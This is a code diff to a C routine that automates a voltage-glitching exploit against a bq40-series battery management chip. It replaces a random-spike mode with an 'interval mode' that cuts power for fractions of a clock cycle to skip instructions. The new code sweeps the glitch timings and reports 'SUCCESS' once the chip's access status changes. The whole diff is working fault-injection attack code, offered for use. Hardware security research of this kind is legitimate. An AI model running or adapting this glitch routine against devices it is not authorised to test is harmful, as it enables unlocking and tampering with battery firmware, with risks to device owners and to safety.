@@ -383,7 +383,7 @@ void device_hack_auto(int fd, struct args* config, uint32_t res_u, uint32_t res_
 
 	printf("Exploit execution modes:\n");
 	printf("  [0] Incremental mode - linearly increases the delay before cutting power\n");
-	printf("  [1] Random mode - randomly picks intervals\n");
+	printf("  [1] Interval mode - cut power for a few cycles to skip instructions\n");
 	printf("Choose the desired mode [0]: ");
 	fflush(stdout);
 	if (read(0, buf, 8) <= 0 || (buf[0] != '\n' && buf[0] != '0' && buf[0] != '1'))
@@ -412,26 +412,33 @@ void device_hack_auto(int fd, struct args* config, uint32_t res_u, uint32_t res_
 
 
 	printf("Exploit init complete\n");
-	static int exploit_iter = 1000000, exploit_step = 50;
-	printf("Running each mode at %d iterations with %d steps per try (%d unique tests total)...\n", exploit_iter, exploit_step, exploit_iter / exploit_step);
+	
+	// EXPLOIT PARAMS
+	static size_t exploit_iter = 1000000;
+	static size_t exploit_step = 100;
+	printf("Running each mode at %ld iterations with %ld steps per try (%ld unique tests total)...\n", exploit_iter, exploit_step, exploit_iter / exploit_step);
 	fflush(stdout);
 
+	// COMMON PARAMS
 	int one_cycle_ns = 60; // for bq40zxy
 	int reset_delay_us = 100*1000, poweron_delay_us = 1000*100;
+	
 	struct timespec shutoff_delay = {
-		0, 4200 // Empirical result
+		0, 0
+	};
+
+	// MODE 1 PARAMS
+	int interval_incr = 30; // Half a cycle
+	int interval_full_cycles = 30;
+
+	int interval_steps = (one_cycle_ns / interval_incr) * interval_full_cycles, cur_step = 0; // for mode 1
+	struct timespec interval_delay = {
+		0, 0
 	};
 
 
-	for (int i = 0; i < exploit_iter; i++)
+	for (size_t i = 0; i < exploit_iter; i++)
 	{
-		// Get a random interval with voltage: ***___***
-		// We need to move this logic HERE to avoid any delay
-		int start = rand() % (2000 + 1);
-		int end = rand() % (3000 + 1);
-		int tail = rand() % (10000 + 1);
-
-
 		switch(config->chip)
 		{
 			case BQ40:
@@ -465,20 +472,35 @@ void device_hack_auto(int fd, struct args* config, uint32_t res_u, uint32_t res_
 				{
 					shutoff_delay.tv_nsec += one_cycle_ns;
 				}
+
+				printf("\r[%ld/%ld] (retry %ld/%ld) shutoff delay : %ld ns...", i, exploit_iter, (i + 1) % exploit_step, exploit_step, shutoff_delay.tv_nsec);
 				break;
-			case 1: // Random spikes
-				usleep(start);
+			case 1: // Tiny spike
+				if (shutoff_delay.tv_nsec != 0)
+					nanosleep(&shutoff_delay, NULL);
 				voltage_ctrl_set(0);
-				usleep(end);
+				if (interval_delay.tv_nsec != 0)
+					nanosleep(&interval_delay, NULL);
 				voltage_ctrl_set(1);
-				usleep(tail);
 
-				// Make a full reset
-				voltage_ctrl_set(0);
-				usleep(reset_delay_us); // full reset
-				voltage_ctrl_set(1);
-				usleep(poweron_delay_us); // wake up
+				usleep(poweron_delay_us);
 
+				if ((i + 1) % exploit_step == 0) // We need to increase it 
+				{
+					cur_step = ((i + 1) / exploit_step) % interval_steps;
+					// First we need to loop through the interval delays
+					if (cur_step == 0)
+					{
+						// Reset interval delay
+						interval_delay.tv_nsec = 0;
+						shutoff_delay.tv_nsec += interval_incr;
+					} else {
+						// Increase interval delay
+						interval_delay.tv_nsec += interval_incr;
+					}
+				}
+
+				printf("\r[%ld/%ld] (retry %ld/%ld) shutoff delay : %ld ns, interval delay : %ld ns (%.2d/%.2d)...", i, exploit_iter, (i + 1) % exploit_step, exploit_step, shutoff_delay.tv_nsec, interval_delay.tv_nsec, cur_step, interval_steps);
 				break;
 		}
 
@@ -495,7 +517,7 @@ void device_hack_auto(int fd, struct args* config, uint32_t res_u, uint32_t res_
 					if (status.access != status_old.access)
 					{
 						printf("SUCCESS !!\n");
-						printf("[%d/%d] (retry %d/%d) timings: shutoff delay : %ld ns\n", i, exploit_iter, (i + 1) % exploit_step, exploit_step, shutoff_delay.tv_nsec);
+						printf("[%ld/%ld] (retry %ld/%ld) timings: shutoff delay : %ld ns, interval delay : %ld ns\n", i, exploit_iter, (i + 1) % exploit_step, exploit_step, shutoff_delay.tv_nsec, interval_delay.tv_nsec);
 						voltage_ctrl_close();
 						quit(fd, 1);
 					}
@@ -505,7 +527,7 @@ void device_hack_auto(int fd, struct args* config, uint32_t res_u, uint32_t res_
 			default:
 				quit(fd, 1);
 		}
-		printf("\r[%d/%d] (retry %d/%d) shutoff delay : %ld ns...", i, exploit_iter, (i + 1) % exploit_step, exploit_step, shutoff_delay.tv_nsec);
+		
 		fflush(stdout);
 	}
 
